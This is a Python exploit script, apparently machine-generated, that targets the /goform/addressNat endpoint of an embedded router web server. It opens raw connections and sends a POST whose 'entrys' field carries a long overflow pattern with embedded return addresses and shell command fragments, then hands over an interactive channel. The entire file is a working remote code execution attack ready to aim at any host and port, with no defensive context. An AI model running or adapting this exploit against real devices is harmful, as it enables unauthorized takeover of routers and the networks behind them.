#!/usr/bin/env python

import sys
import socket
import time
import argparse

import nclib

parser = argparse.ArgumentParser(description="Launch exploit.")
parser.add_argument('host', type=str)
parser.add_argument('port', type=int)
parser.add_argument('-c', '--cmd', nargs="*", type=str)

args = parser.parse_args()

############## render actions #################
# RexWaitAction
time.sleep(5)


# RexOpenChannelAction
r = nclib.Netcat((args.host, args.port), udp=False, verbose=True)


# RexSendAction
r.send(b'GET /goform/addressNat HTTP/1.1\r\nHost: 172.17.0.2\r\nUser-Agent: curl/7.58.0\r\nAccept: */*\r\nCookie: csrftoken=aaaaaa; password=bbbbbb\r\n\r\n')


# RexCloseChannelAction
r.close()


# RexWaitAction
time.sleep(1)


# RexOpenChannelAction
r = nclib.Netcat((args.host, args.port), udp=False, verbose=True)


# RexSendAction
r.send(b'POST /goform/addressNat/ HTTP/1.1\r\nHost: 172.17.0.2\r\nUser-Agent: curl/7.58.0\r\nAccept: */*\r\nCookie: csrftoken=aaaaaa; password=bbbbbb\r\nContent-Length: 1057\r\nContent-Type: application/x-www-form-urlencoded\r\nExpect: 100-continue\r\n\r\nentrys=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaah\xbc\xbf\xd9?ls -\xa4\x85\xdf?\xd4\xd4\xd6\xd4p\x0f\xdc?\xd4\xd4\xd6\xc4\xbc\xbf\xd9?la;\xff\xa8\x85\xdf?\xd4\xd4\xd6\xd4p\x0f\xdc?\xd4\xd4\xd6\xd0|\xfe\xdd?\xc8\x85\xdf?p\xf2\xdd?naaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak&mitInterface=bbb&page=ccc')


# RexWaitAction
time.sleep(1)

r.interactive()
